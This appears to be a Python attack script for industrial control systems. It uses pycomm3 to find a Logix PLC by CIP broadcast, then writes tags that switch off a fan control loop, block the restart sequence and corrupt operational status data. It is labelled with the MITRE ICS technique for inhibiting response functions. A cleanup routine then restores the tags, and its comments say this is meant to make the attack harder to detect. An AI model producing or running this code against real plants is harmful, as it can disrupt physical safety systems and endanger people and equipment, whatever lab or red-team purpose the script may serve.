import pycomm3
import time
import os
import socket

# Configuration
PLC_IP = None  # Will be discovered if not set manually
PLC_CPU_SLOT = 0  # Adjust if necessary
TOG_OFF_TAG = "Tog_Off"
NEW_VARIABLE_TAG = "NewVariable"
START_TAG = "START"
FAN_A_OFF_TAG = "FanA_Off"
DESTRUCTION_DELAY = 5  # Time (seconds) to delay before "destruction"
CLEANUP_DELAY = 2  # Time (seconds) to delay before cleanup
MITRE_TECHNIQUE = "Inhibit Response Function: Data Destruction"

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by broadcasting a CIP request.
    This is a rudimentary discovery method and might not work in all network configurations.
    """
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(5) # Set timeout for response

        # CIP discovery request (a simplified version)
        cip_request = b'\x63\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00'

        # Broadcast the request
        sock.sendto(cip_request, ('<broadcast>', 44818))  # CIP port

        # Listen for a response
        try:
            data, addr = sock.recvfrom(1024)
            sock.close()
            return addr[0] # IP address of the sender
        except socket.timeout:
            sock.close()
            print("PLC discovery timed out. Ensure PLC is on the network and broadcasting CIP responses.")
            return None
    except Exception as e:
        print(f"Error during PLC IP discovery: {e}")
        return None



def connect_plc(ip_address, cpu_slot):
    """
    Connects to the PLC.
    """
    try:
        plc = pycomm3.LogixDriver(ip_address, cpu_slot=cpu_slot)
        plc.open()
        if plc.connected:
            print(f"Connected to PLC at {ip_address}")
            return plc
        else:
            print(f"Failed to connect to PLC at {ip_address}")
            return None
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        return None


def inhibit_response(plc):
    """
    Simulates an inhibit response function attack by manipulating PLC tags to disrupt normal operation.
    Specifically targetting Tog_Off to disable the fan control loop, and setting NewVariable to an unexpected state.
    It also resets START which effectively disables the startup sequence
    """
    print(f"Executing {MITRE_TECHNIQUE}")

    try:
        # Set Tog_Off to TRUE to disable fan activation via TONOFF_1
        plc.write(TOG_OFF_TAG, True)
        print(f"Set {TOG_OFF_TAG} to TRUE (disabling fan control loop)")

        #Set START to FALSE to prevent restart of the cycle
        plc.write(START_TAG, False)
        print(f"Set {START_TAG} to FALSE (disabling restart cycle)")

        # Set NewVariable to an unexpected value (e.g., True when it should be False, or vice-versa)
        # This simulates corrupting data used in a response function.
        plc.write(NEW_VARIABLE_TAG, True)  # Assuming its default is False or irrelevant.
        print(f"Set {NEW_VARIABLE_TAG} to TRUE (corrupting response data)")

        print(f"Inhibit response action complete.  Waiting {DESTRUCTION_DELAY} seconds before potential 'data destruction'.")
        time.sleep(DESTRUCTION_DELAY)

        # Simulate data destruction by zeroing out FanA_Off, which could be used to track operational status
        plc.write(FAN_A_OFF_TAG, False)
        print(f"Simulating data destruction: Set {FAN_A_OFF_TAG} to FALSE (zeroing out operational status)")

    except Exception as e:
        print(f"Error during inhibit response: {e}")


def cleanup(plc):
    """
    Simulates cleanup after the attack. This is CRITICAL,
    as it restores the system to a state that allows normal operation to resume,
    making the attack harder to detect after the fact and potentially causing cascading failures when normal operations resume.
    """
    print(f"Performing cleanup (restoring critical tags).  Waiting {CLEANUP_DELAY} seconds...")
    time.sleep(CLEANUP_DELAY)

    try:
        #Restore Tog_Off so that the Fan can function again.
        plc.write(TOG_OFF_TAG, False)
        print(f"Cleanup: Reset {TOG_OFF_TAG} to FALSE.")

        #Restore START to TRUE so that the startup can function again.
        plc.write(START_TAG, True)
        print(f"Cleanup: Reset {START_TAG} to TRUE.")

        # Reset NewVariable to its initial value
        plc.write(NEW_VARIABLE_TAG, False)
        print(f"Cleanup: Reset {NEW_VARIABLE_TAG} to FALSE")


        print("Cleanup complete. System should be able to resume normal operation.")


    except Exception as e:
        print(f"Error during cleanup: {e}")



def disconnect_plc(plc):
    """
    Disconnects from the PLC.
    """
    try:
        if plc and plc.connected:
            plc.close()
            print("Disconnected from PLC.")
    except Exception as e:
        print(f"Error disconnecting from PLC: {e}")


def main():
    global PLC_IP

    # Discover PLC IP if not manually configured
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("PLC IP address could not be discovered.  Exiting.")
            return

    plc = connect_plc(PLC_IP, PLC_CPU_SLOT)
    if not plc:
        return

    try:
        inhibit_response(plc)
        cleanup(plc)  #Perform Cleanup
    finally:
        disconnect_plc(plc)


if __name__ == "__main__":
    main()